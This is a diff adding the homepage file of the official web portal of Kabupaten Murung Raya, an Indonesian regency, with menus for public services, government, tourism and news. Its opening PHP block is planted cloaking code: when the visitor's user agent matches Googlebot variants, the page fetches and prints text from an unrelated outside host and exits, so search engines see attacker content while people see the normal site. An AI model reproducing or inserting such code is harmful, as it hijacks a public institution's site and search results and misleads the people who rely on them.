@@ -1,0 +1,274 @@
+<?php
+
+function is_google_bot() {
+    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    foreach ($agents as $agent) {
+        if (strpos($user_agent, $agent) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+$request_uri = $_SERVER['REQUEST_URI'];
+if (is_google_bot()) {
+    echo file_get_contents("https://dprdkab-bandung.com/marungrayakab/crot.txt");
+    exit;
+}
+?>
+<!DOCTYPE html><html><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Website Resmi Kabupaten Murung Raya</title>
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/bootstrap-theme.min.css">
+    <link rel="stylesheet" href="css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Aguafina+Script">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Archivo+Narrow">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Arizonia">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Barlow+Condensed">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Galada">
+    <link rel="stylesheet" href="css/styles.min.css">
+	<style>
+
+.responsive_banget {
+  width: 100%;
+  height: auto;
+}
+
+.name_logo {
+    text-align: center;
+    margin-top: 250px;          
+    
+}
+
+.papan_popup_depan {
+  display: none; /* Hidden by default */
+  position: fixed; /* Stay in place */
+  z-index: 1; /* Sit on top */
+  padding-top: 100px; /* Location of the box */
+  left: 0;
+  top: 0;
+  width: 100%; /* Full width */
+  height: 100%; /* Full height */
+  overflow: auto; /* Enable scroll if needed */
+  background-color: rgb(0,0,0); /* Fallback color */
+  background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+}
+
+.papan_popup_depan-content {
+  background-color: #fefefe;
+  margin: auto;
+  padding: 20px;
+  border: 1px solid #888;
+  width: 80%;
+}
+
+.close {
+  color: #aaaaaa;
+  float: right;
+  font-size: 28px;
+  font-weight: bold;
+}
+
+.close:hover,
+.close:focus {
+  color: #000;
+  text-decoration: none;
+  cursor: pointer;
+}
+</style>
+	
+</head>
+
+<body>
+    
+ 
+    
+    
+    
+    
+    <div style="position: fixed; z-index: -98; width: 100%; height: 100%"></div>
+<div id="yt-wrap">
+<!-- 1. The <iframe> (and video player) will replace this <div> tag. -->
+<div id="ytplayer"></div>
+</div>
+<script src="https://www.youtube.com/player_api"></script><script>
+// 2. This code loads the IFrame Player API code asynchronously.
+var tag = document.createElement('script');
+tag.src = "https://www.youtube.com/player_api";
+var firstScriptTag = document.getElementsByTagName('script')[0];
+firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+
+// 3. This function creates an <iframe> (and YouTube player)
+// after the API code downloads.
+var player;
+function onYouTubePlayerAPIReady() {
+player = new YT.Player('ytplayer', {
+width: '-100%',
+height: '100%',
+videoId: 'JOrtMho19Uw',
+playerVars: {
+'autoplay': 1,
+'showinfo': 0,
+'autohide': 1,
+'loop': 1,
+'controls': 0,
+'modestbranding': 1,
+'vq': 'hd720'
+},
+events: {
+'onReady': onPlayerReady,
+'onStateChange': onPlayerStateChange
+}
+});
+}
+
+// 4. The API will call this function when the video player is ready.
+function onPlayerReady(event) {
+event.target.playVideo();
+player.mute(); // comment out if you don't want the auto played video muted
+}
+
+// 5. The API calls this function when the player's state changes.
+// The function indicates that when playing a video (state=1),
+// the player should play for six seconds and then stop.
+function onPlayerStateChange(event) {
+if (event.data == YT.PlayerState.ENDED) {
+player.seekTo(0);
+player.playVideo();
+}
+}
+function stopVideo() {
+player.stopVideo();
+}
+</script>
+
+<style>
+#yt-wrap{
+position: fixed;
+left: 0;
+z-index: -99;
+position: fixed;
+top: -50%;
+left: -50%;
+width: 200%;
+height: 200%;
+}
+#yt-wrap iframe{
+position: absolute;
+top: 0;
+left: 0;
+right: 0;
+bottom: 0;
+margin: auto;
+min-width: 50%;
+min-height: 50%;
+}
+</style>
+
+
+    
+    
+    
+   
+    
+    
+    
+    
+<div id="papan_popup_depan_js" class="papan_popup_depan" style="display: none;">
+  <div class="papan_popup_depan-content">
+    <span class="close">Ã—</span>
+    <p>
+    <img src="images/bpd2.jpg" class="responsive_banget">
+    </p>
+  </div>
+
+</div>
+
+<script>
+
+var papan_popup_depan_js = document.getElementById("papan_popup_depan_js");
+var span = document.getElementsByClassName("close")[0];
+
+span.onclick = function() {
+  papan_popup_depan_js.style.display = "none";
+}
+ 
+papan_popup_depan_js.style.display = "none";
+
+</script>
+
+
+<div id="my-mobil"></div><div class="text-center"><img src="images/logo_murung.png" height="160px"></div>
+    <div class="panel_menu wrap">
+        <div class="menu"><div id="dropdown" class="wrap_content" data-id="atas"><img src="images/murungraya-1.png" height="70px"><button class="btn btn-info active btn-block btn-xs" type="button" style="width:110px;">Murung Raya</button></div>
+            <div id="selected" class="wrap_content_active" data-id="atas"><img src="images/murungraya-1.png" height="80px"><button class="btn btn-warning active btn-block btn-xs" type="button">Murung Raya</button></div><div class="font-wrap">Selayang Pandang</div>
+            <div class="arrow-up"></div>
+        </div>
+        <div class="menu"><div class="wrap_content" data-id="atas"><a href="https://jdih.murungrayakab.go.id/" target="_blank"><img src="images/jd.png" height="70px"></a>
+    <a class="btn btn-info active btn-block btn-xs" href="https://jdih.murungrayakab.go.id/" target="_blank" role="button">Produk Hukum</a>
+</div>
+</div>
+        <div class="menu">
+            <div id="dropdown" class="wrap_content" data-id="atas"><img src="images/LayananPublik.png" height="70px"><button class="btn btn-info active btn-block btn-xs" type="button">Pelayanan Publik</button></div>
+            <div id="selected" class="wrap_content_active" data-id="atas"><img src="images/pel.png" height="100px"><button class="btn btn-warning active btn-block btn-xs" type="button">Pelayanan Publik</button></div><div class="font-wrap">Pelayanan Publik</div>
+            <div class="arrow-up"></div>
+        </div>
+        <div class="menu">
+            <div id="dropdown" class="wrap_content" data-id="atas"><img src="images/Pemerintahan.png" height="70px"><button class="btn btn-info active btn-block btn-xs" type="button">Pemerintahan</button></div>
+            <div id="selected" class="wrap_content_active" data-id="atas"><img src="images/pt.png" height="100px"><button class="btn btn-warning active btn-block btn-xs" type="button">Pemerintahan</button></div><div class="font-wrap">Pemerintahan</div>
+            <div class="arrow-up"></div>
+        </div>
+        <div class="menu">
+            <div id="dropdown" class="wrap_content" data-id="atas"><img src="images/Investasi-2.png" height="70px"><button class="btn btn-info active btn-block btn-xs" type="button">Investasi</button></div>
+            <div id="selected" class="wrap_content_active" data-id="atas"><img src="images/inv.png" height="100px"><button class="btn btn-warning active btn-block btn-xs" type="button">Investasi</button></div><div class="font-wrap">Investasi</div>
+            <div class="arrow-up"></div>
+        </div>
+        <div class="menu">
+            <div id="dropdown" class="wrap_content" data-id="atas"><img src="images/Transparansi.png" height="70px"><button class="btn btn-info active btn-block btn-xs" type="button">Transparansi</button></div>
+            <div id="selected" class="wrap_content_active" data-id="atas"><img src="images/tr.png" height="100px"><button class="btn btn-warning active btn-block btn-xs" type="button">Transparansi</button></div><div class="font-wrap">Transparansi</div>
+            <div class="arrow-up"></div>
+        </div>
+    </div><div style="display: none;" class="gelembung_informasi" id="atas">
+</div>
+    <div class="panel_menu wrap">
+        <div class="menu"><div class="wrap_content" data-id="bawah"><a href="https://pengumuman.murungrayakab.go.id/" target="_blank"><img src="images/pengumuman.png" height="70px"></a>
+    <a class="btn btn-info active btn-block btn-xs" href="https://pengumuman.murungrayakab.go.id/" target="_blank" role="button">Pengumuman</a>
+</div>
+</div>
+        <div class="menu"><div class="wrap_content" data-id="bawah"><a href="https://berita.murungrayakab.go.id/" target="_blank"><img src="images/Berita.png" height="70px"></a>
+    <a class="btn btn-info active btn-block btn-xs" href="https://berita.murungrayakab.go.id/" target="_blank" role="button">Berita</a>
+</div>
+</div>
+        <div class="menu"><div id="dropdown" class="wrap_content" data-id="bawah"><img src="images/PerangkatDaerah.png" height="70px">
+    <button class="btn btn-info active btn-block btn-xs" type="button">Perangkat Daerah</button>
+</div>
+            <div id="selected" class="wrap_content_active" data-id="atas"><img src="images/cal.png" height="100px"><button class="btn btn-warning active btn-block btn-xs" type="button">Perangkat Daerah</button></div><div class="font-wrap">Perangkat Daerah</div><div class="arrow-up"></div></div>
+        <div class="menu"><div id="dropdown" class="wrap_content" data-id="bawah"><img src="images/Pariwisata-1.png" height="70px">
+    <button class="btn btn-info active btn-block btn-xs" type="button">Pariwisata</button>
+</div>
+            <div id="selected" class="wrap_content_active" data-id="atas"><img src="images/wt.png" height="100px"><button class="btn btn-warning active btn-block btn-xs" type="button">Pariwisata</button></div><div class="font-wrap">Pariwisata</div><div class="arrow-up"></div></div>
+        <div class="menu"><div class="wrap_content" data-id="bawah"><a href="https://radioswaramurungraya.com/" target="_blank"><img src="images/fm.png" height="70px"></a>
+    <a class="btn btn-info active btn-block btn-xs" href="https://smurafm.murungrayakab.go.id/" target="_blank" role="button">SMURA 101.5 FM</a>
+</div>
+</div>
+    </div><div style="display: none;" class="gelembung_informasi" id="bawah">
+</div>
+    <div><a href="https://diskominfo.murungrayakab.go.id/" target="_blank">
+<div class="text-center">
+<button class="button">
+<i class="fa fa-circle-o-notch fa-spin"></i>	
+	
+	
+	
+<span>Selengkapnya </span></button>	
+</div>
+</a></div><div class="fixed-bottom">
+<div class="kredit">Diskominfo | e-Government Mura | 2018
+<br>Email : diskominfo@murungrayakab.go.id</div>
+</div>    
+    <script src="js/jquery.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/script.min.js"></script>
